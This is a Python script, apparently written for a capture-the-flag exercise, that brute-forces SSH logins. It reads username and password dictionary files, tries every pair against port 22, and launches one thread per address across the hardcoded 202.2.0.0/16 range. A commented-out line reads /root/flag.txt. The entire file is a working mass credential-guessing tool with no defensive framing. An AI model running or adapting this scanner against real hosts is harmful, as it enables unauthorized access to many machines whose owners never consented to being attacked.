import paramiko
import threading

# create ssh connection
sshc = paramiko.SSHClient();

# is continue remote connect when first connect,default yes
sshc.set_missing_host_key_policy(paramiko.AutoAddPolicy());


def connectSSH(ip,userName,passWord):
	try:
		sshc.connect(ip,22,userName,passWord,timeout=5);
		print("++++++++ success ++++++++");
	except Exception as e:
		if str(e).find("time") >= 0:
			return True;
		else:
			return False;
	


def tryUserAndPwd(ip):	
	try:		
		with open("user.txt", 'r') as uf:
			for userLine in uf.readlines():
				try:
					with open("pwd.txt", 'r') as pf:     # Open dictionary file
						for pwdLine in pf.readlines():
							userName = userLine.strip('\r').strip('\n');
							passWord = pwdLine.strip('\r').strip('\n');
							print('[+] Trying: ' + ip + ':' + userName + ':' + passWord );
							isTimedOut = connectSSH(ip,userName,passWord);
							if isTimedOut:
								return;
							#file = sshc.exec_command("cat /root/flag.txt")[1].readlines()
				except:
					print("open file failed")
	except:
		print("open file failed");

def tryIps():
	for ip3 in range(0,255):
		for ip4 in range(0,255):
			ip = "202.2." + str(ip3) + "." + str(ip4);
			t=threading.Thread(target=tryUserAndPwd,name='runThread',args=(ip,));
			t.start();

tryIps();
